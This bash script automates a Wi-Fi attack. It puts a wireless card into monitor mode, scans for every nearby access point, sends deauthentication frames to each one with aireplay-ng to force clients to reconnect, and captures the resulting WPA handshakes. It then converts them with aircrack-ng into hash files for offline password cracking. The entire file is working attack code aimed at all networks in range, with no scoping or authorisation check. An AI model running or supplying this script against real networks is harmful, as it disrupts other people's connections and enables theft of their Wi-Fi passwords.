#!/bin/bash

checkHandshakes(){
        echo ""
        echo "Clean cap file.."
        output=`wpaclean /home/kali/cleanshakes.cap /home/kali/shakes-01.cap` #> /dev/null`

	ls /home/kali/
        if [[ "$output" == *"Net"* ]]; then
                echo "Handshakes detected!!!"
                if [[ -d /home/kali/shakes ]]
                then

                        if [[ `ls /home/kali/shakes/ | wc -l` -ne 0 ]]; then          
                                lastNum=$(($(head -n 1 /home/kali/shakes/.counter)+1))                                 
                                aircrack-ng -j /home/kali/shakes/shake${lastNum} /home/kali/cleanshakes.cap > /dev/null
                                echo $lastNum > /home/kali/shakes/.counter
                        else                            
                                mkdir /home/kali/shakes/                                                      
                                aircrack-ng -j /home/kali/shakes/shake1 /home/kali/cleanshakes.cap > /dev/null
                                touch /home/kali/shakes/.counter     
                                echo "1" > /home/kali/shakes/.counter
                        fi
                else                           
                        mkdir /home/kali/shakes                                                       
                        aircrack-ng -j /home/kali/shakes/shake1 /home/kali/cleanshakes.cap > /dev/null
                        touch /home/kali/shakes/.counter     
                        echo "1" > /home/kali/shakes/.counter
                fi

        	rm /home/kali/cleanshakes.cap
        else
                echo "No handshakes" 
        fi                    
        rm /home/kali/shakes-*
}

main(){
	airmon-ng check kill
	airmon-ng start wlan0
  	timeout 5 airodump-ng -w /home/kali/shakes wlan0mon < /dev/null > /dev/null 
	#ip link set wlan0mon down
	#iw wlan0mon set monitor control
	#ip link set wlan0mon up
	counter=0
	while read line
	do
		if [[ $counter -lt 2 ]]
	       	then
			counter=$(($counter + 1 ))
			continue
		fi

		channel=`echo $line | awk '{print $6}'`
		channel=${channel::-1} #delete last ,
		bssid=`echo $line | awk '{print $1}'`
		bssid=${bssid::-1}
		echo $bssid
		echo $channel
		
		iwconfig wlan0mon channel $channel
		timeout 20 airodump-ng --bssid $bssid -w /home/kali/shakes wlan0mon < /dev/null > /dev/null &
		aireplay-ng -a $bssid -0 10 wlan0mon
		sleep 10
		checkHandshakes

	done < /home/kali/shakes-01.csv

}
main
